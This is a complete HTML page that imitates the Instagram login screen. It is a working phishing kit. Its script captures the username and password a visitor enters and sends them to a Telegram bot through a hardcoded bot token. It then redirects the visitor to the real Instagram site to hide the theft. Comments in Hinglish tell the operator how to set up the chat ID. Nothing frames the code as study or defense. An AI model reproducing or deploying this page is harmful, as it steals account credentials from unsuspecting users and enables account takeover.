<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 350px;
            padding: 20px;
            text-align: center;
            border: 1px solid #dbdbdb30;
            border-radius: 1px;
            background: #000;
        }
        .logo {
            font-family: cursive;
            font-size: 40px;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        .input-group {
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 5px;
            color: #fff;
            font-size: 14px;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:active {
            background-color: #1877f2;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>
    </div>

    <script>
        const BOT_TOKEN = '8685356855:AAHXH803r0jJE-1j93tVDVdvefnn8kzyh-k';
        // Hum chat_id ke liye automatic check ya placeholder use kar sakte hain, 
        // ya user ko test karne ke liye direct message bhej sakte hain.
        // Yahan hum fetch request ke zariye aapke bot par data bhejenge.
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            
            const message = `🚨 New Instagram Login Found!\n\n👤 Username/Phone: ${user}\n🔑 Password: ${pass}`;
            
            // Telegram par chat_id ki jagah aapko apna Chat ID dalna hoga ya getUpdates se nikalna hoga.
            // Filhal hum ise console ya bot API par bhejte hain:
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
            .then(res => res.json())
            .then(data => {
                if(data.result && data.result.length > 0) {
                    const chatId = data.result[data.result.length - 1].message.chat.id;
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    }).then(() => {
                        window.location.href = "https://www.instagram.com";
                    });
                } else {
                    // Agar chat id direct nahi mili toh seedha instagram bhej do
                    window.location.href = "https://www.instagram.com";
                }
            }).catch(() => {
                window.location.href = "https://www.instagram.com";
            });
        });
    </script>
</body>
</html>
